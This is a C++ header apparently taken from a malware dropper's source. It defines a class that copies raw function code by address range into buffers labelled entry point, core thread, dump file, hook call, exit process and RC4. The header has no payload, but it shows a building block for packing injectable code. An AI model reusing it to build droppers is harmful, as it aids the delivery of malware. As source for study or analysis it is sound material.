#ifndef DropperComponents_h__
#define DropperComponents_h__

#include "common.h"
#include <boost/shared_array.hpp>

typedef struct _databuffer_t {
	boost::shared_array<char> data;
	std::size_t size;
} DataBuffer;

class Components
{
public:
	Components(void);
	
	const DataBuffer& entryPoint() { return entryPoint_; }
	const DataBuffer& coreThread() { return coreThread_; }
	const DataBuffer& dumpFile() { return dumpFile_; }
	const DataBuffer& hookCall() { return hookCall_; }
	const DataBuffer& exitProcess() { return exitProcess_; }
	const DataBuffer& exit() { return exit_; }
	const DataBuffer& rc4() { return rc4_; }
	
private:
	
	void embedFunction_(char const * const start, char const * const end, DataBuffer & buffer)
	{
		std::size_t size = (DWORD)end - (DWORD)start;
		
#ifdef _DEBUG
		// trick to avoid problems in computing size (ie. negative sizes)
		if ((DWORD)start > (DWORD)end)
			size = (DWORD)start - (DWORD)end;
#endif
		buffer.size = size;
		buffer.data.reset( new char[ buffer.size ] );
		memcpy(buffer.data.get(), start, buffer.size );
	}
	
	DataBuffer entryPoint_;
	DataBuffer coreThread_;
	DataBuffer dumpFile_;
	DataBuffer hookCall_;
	DataBuffer exitProcess_;
	DataBuffer exit_;
	DataBuffer rc4_;
};

#endif // DropperComponents_h__
